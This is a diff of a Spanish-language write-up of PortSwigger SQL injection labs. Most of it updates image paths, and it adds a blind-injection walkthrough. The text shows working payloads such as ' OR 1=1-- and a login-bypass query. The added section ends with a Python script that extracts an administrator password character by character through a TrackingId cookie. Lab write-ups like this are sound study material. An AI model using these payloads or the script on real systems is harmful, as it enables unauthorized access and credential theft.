@@ -28,7 +28,7 @@ Sabiendo esto hacemos la búsqueda:
 
 Podemos observar como salen 4 elementos cuando salían 3 anteriormente.
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Podemos ver que hay una inyección por lo que realizamos esta sentencia.
 
@@ -48,7 +48,7 @@ Lo ponemos en la búsqueda.
 ?category=Gifts' OR 1=1--'
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab: SQL injection vulnerability allowing login bypass
 
@@ -74,7 +74,7 @@ SELECT * FROM usuarios WHERE username='administrator' AND contraseña= '' OR 1=1
 
 Por lo tanto insertamos eso en el login.
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Lab: SQL injection attack, querying the database type and version on Oracle
 
@@ -308,15 +308,65 @@ La base de datos contiene una tabla diferente llamada **`users`**, con columnas 
 
 ### Resolución
 
-A diferencia de los laboratorios anteriores la vulnerabilidad está en **TrackingID**.
+A diferencia de los laboratorios anteriores la vulnerabilidad está en **TrackingID**. Lo sabemos porque no nos sale el **Welcome Back**.
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Sabiendo esto vamos a comprobar si existe la tabla users.
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Como vemos sí que existe la tabla users. Vamos a ver si el usuario administrador está en users.
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+Sí está en la tabla de usuarios por lo que vamos a ver su contraseña. Primero debemos saber la longitud de la contraseña.&#x20;
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Ya sabemos que la contraseña tiene longitud mayor que 1 por lo que vamos a ver cuánta longitud.
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+Vamos a comprobar los caracteres que tiene la contraseña yendo al **Intruder.**
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Iría caracter a caracter y sabemos que la primera es una **e**. Mejor script en Python para hacerlo 20 veces o Cluster bomb.
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+Este sería el script de Python.
 
 ```
-ID'+and+(select+username+from+users+where+username%3d'administrator'+and+LENGTH(password)>1)%3d'administrator'--;
+import requests
+import string
+import urllib3
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+url = 'https://0a41005d03114836802e3037006f00e1.web-security-academy.net/'  # Pon aquí la URL de la página objetivo
+
+payload = "' AND (SELECT SUBSTRING(password, {}, 1) FROM users WHERE username='administrator')='{}'--"
+characters = string.printable
+
+password = ''
+
+for i in range(1, 21):
+    for char in characters:
+        cookie = {'TrackingId': 'GZJbtWWgdaT32Y4D' + payload.format(i, char)}
+        response = requests.get(url, cookies=cookie, verify=False)
+        if "Welcome" in response.text:
+            password += char
+            print(f"[+] Carácter encontrado: {char} - Contraseña parcial: {password}")
+            break
+
+print(f"\n[+] Contraseña completa encontrada: {password}")
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
-```
-ID' and (select substring (password,1,1) from users where username='administrator')='a'--
-```
+Nos logueamos con las credenciales.
 
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
